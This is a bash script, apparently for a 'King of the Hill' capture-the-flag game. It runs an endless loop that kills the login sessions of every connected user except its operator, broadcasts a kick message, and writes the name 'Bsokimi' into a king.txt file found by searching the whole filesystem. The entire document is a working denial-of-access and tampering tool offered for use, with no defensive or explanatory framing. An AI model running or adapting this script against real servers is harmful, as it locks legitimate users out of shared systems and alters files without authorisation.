#!/bin/bash

# Get your IP address
my_ip=$(curl -s ifconfig.me)

# Search for the "king.txt" file and set the file path
file_path=$(find / -name "king.txt" 2>/dev/null)

# Message to broadcast
kick_message="Someone has been kicked out of the server!"

while true; do
  # Get the list of connected IPs
  connected_ips=$(who | awk '{print $5}' | grep -v "$my_ip" | cut -d '(' -f 2 | cut -d ')' -f 1)

  # Remove other IPs from the server
  for ip in $connected_ips; do
    echo "Kicking out $ip..."
    pkill -u "$(who | awk -v ip="$ip" '$5 ~ ip {print $1}')" && echo "$kick_message" | wall
  done

  # Check if king.txt exists and contains "Bsokimi"
  if [ -n "$file_path" ] && ! grep -q "Bsokimi" "$file_path"; then
    echo "Bsokimi" >> "$file_path"
    echo "Added 'Bsokimi' to $file_path"
  fi

  sleep 5 # Wait for 5 seconds before checking again
done
